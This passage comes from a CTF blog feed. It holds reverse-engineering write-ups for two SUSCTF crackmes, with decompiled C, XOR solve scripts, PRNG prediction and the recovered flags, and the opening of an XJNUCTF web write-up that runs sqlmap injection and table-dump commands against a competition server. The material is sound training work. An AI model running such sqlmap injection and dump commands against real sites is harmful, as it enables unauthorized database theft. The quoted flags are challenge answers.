  v4<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">109</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">26</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">28</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">21</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">74</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">122</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">29</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">17</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">31</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">73</span><span class="token punctuation">;</span>
  v4<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">99</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">79</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">41</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">90</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">69</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">121</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">80</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">98</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">74</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">37</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">119</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">116</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">109</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">44</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Give me flag: "</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">30</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">29</span><span class="token punctuation">;</span> <span class="token operator">++</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">^</span> v4<span class="token punctuation">[</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v5<span class="token punctuation">[</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something wrong, you should try harder."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congrazzzzzz~ You got it!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something wrong, you should try harder."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>分析代码 若要获得flag 需要将v4的每一位与v5的每一位xor操作 即可</p>
<p>EXP </p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">v4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span>
v5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">]</span>

str <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    str <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token punctuation">(</span>v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> str
</code></pre>
<p>运行即可</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>FLAG : SUSCTF{x0r_1s_e4sy_tO_r3ver5e}
</code></pre><h3 id="150-1"><a href="#150-1" class="headerlink" title="150"></a>150</h3><p><img src="/2018/10/29/SUSCTF-Writeup-Reverse/6.png" alt=""><br>载入IDA 分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-44h]</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-40h]</span>
  __int16 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+40h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+48h] [rbp-8h]</span>

  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Give me flag: "</span><span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">39</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">38</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">127</span> <span class="token operator">^</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> c_text<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Right"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>核心操作</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">38</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">127</span> <span class="token operator">^</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> c_text<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>   和上一题类似 只不过需要猜测随机数<br>   但是srand 可以预测 所以我们 先写一个随机数预测脚本</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span>
<span class="token function">intmain</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>

 <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">50</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d,"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>
</code></pre>
<p>EXP </p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">

c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x7B</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x4C</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x2B</span><span class="token punctuation">,</span><span class="token number">0xA</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x2C</span><span class="token punctuation">,</span><span class="token number">0xE</span><span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x5F</span><span class="token punctuation">,</span><span class="token number">0x2C</span><span class="token punctuation">,</span><span class="token number">0x3B</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x1F</span><span class="token punctuation">,</span><span class="token number">0x7E</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0xD</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0x5E</span><span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">]</span>
srand <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span>
str <span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    str <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>srand<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> str
</code></pre>
<pre><code>SUSCTF{rand0m_m4ybe_no7_saf3_sOmet1mes}
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;60&quot;&gt;&lt;a href=&quot;#60&quot; class=&quot;headerlink&quot; title=&quot;60&quot;&gt;&lt;/a&gt;60&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/2018/10/29/SUSCTF-Writeup-Reverse/1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;下载载入IDA
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XJNUCTF-Writeup</title>
    <link href="http://iosmosis.github.io/2018/10/04/XJNUCTF-Writeup/"/>
    <id>http://iosmosis.github.io/2018/10/04/XJNUCTF-Writeup/</id>
    <published>2018-10-04T09:57:59.000Z</published>
    <updated>2018-10-04T12:00:16.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/1.png" alt="1"></p>
<p>查看</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/2.png" alt="2"></p>
<p>得到提示 应该是注入</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/3.png" alt="3"></p>
<p>测试发现这里存在sql语句查询</p>
<p>所以用sqlmap这个工具跑一下就可以了</p>
<p>sqlmap.py -u “<a href="http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1" target="_blank" rel="external">http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1</a>“</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/4.jpg" alt="4"></p>
<p>确实存在注入</p>
<p>sqlmap.py -u “<a href="http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1" target="_blank" rel="external">http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1</a>“ –tables</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/5.png" alt="5"></p>
<p>得到flag表 那我们dump出来看一下</p>
<p>sqlmap.py -u “<a href="http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1" target="_blank" rel="external">http://ctf.xjnu.edu.cn:9900/web10/index.php?id=1</a>“ –dump -T flag</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/Users\TTTR\ios\source\_posts\XJNUCTF-Writeup\6.png" alt="6"></p>
